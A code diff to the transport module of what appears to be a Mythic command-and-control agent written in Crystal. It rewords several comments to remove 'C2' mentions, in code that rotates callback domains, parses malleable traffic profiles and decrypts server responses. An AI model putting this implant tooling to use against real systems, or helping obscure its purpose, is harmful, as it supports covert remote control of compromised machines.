@@ -108,7 +108,7 @@ module Dark::Agent::Transport
 
     # Select a domain from the available callback_domains based on rotation strategy
     #
-    # Mythic malleable profile: Chooses a C2 server from the available domains
+    # Mythic malleable profile: Chooses a server from the available domains
     private def select_callback_domain
       # Handle empty domains list
       if @available_domains.empty?
@@ -213,10 +213,10 @@ module Dark::Agent::Transport
 
     # Parse the malleable profile from config
     #
-    # Mythic malleable profile: Loads C2 profile configuration for traffic customization
+    # Mythic malleable profile: Loads profile configuration for traffic customization
     private def parse_profile
       begin
-        # Get the C2 profile and convert to hash
+        # Get the profile and convert to hash
         c2_profile = @config.c2_profile
         if c2_profile.as_h?
           @profile = c2_profile.as_h
@@ -322,7 +322,7 @@ module Dark::Agent::Transport
 
     # Implementation of process_response required by Base class
     #
-    # Mythic communication: Processes and decrypts C2 responses with transforms
+    # Mythic communication: Processes and decrypts server responses with transforms
     protected def process_response(raw_body : String) : String
       # Use the POST transforms by default for processing responses
       process_with_transforms(raw_body, @post_transforms_server)
@@ -330,7 +330,7 @@ module Dark::Agent::Transport
 
     # Implementation of send_request required by Base class
     #
-    # Mythic communication: Sends data to C2 using malleable profile transforms
+    # Mythic communication: Sends data to server using malleable profile transforms
     protected def send_request(message : String) : {::HTTP::Client::Response?, String?}
       # If using round-robin, select the next domain before sending
       if @config.is_a?(Config::HTTPX) && @config.as(Config::HTTPX).domain_rotation == "round-robin"
@@ -534,7 +534,7 @@ module Dark::Agent::Transport
 
     # Build a full URL from the selected domain and path
     #
-    # Mythic communication: Builds C2 server URL from profile configuration
+    # Mythic communication: Builds server URL from profile configuration
     protected def build_full_url(path : String) : String
       # Start with the selected domain
       url = @selected_domain
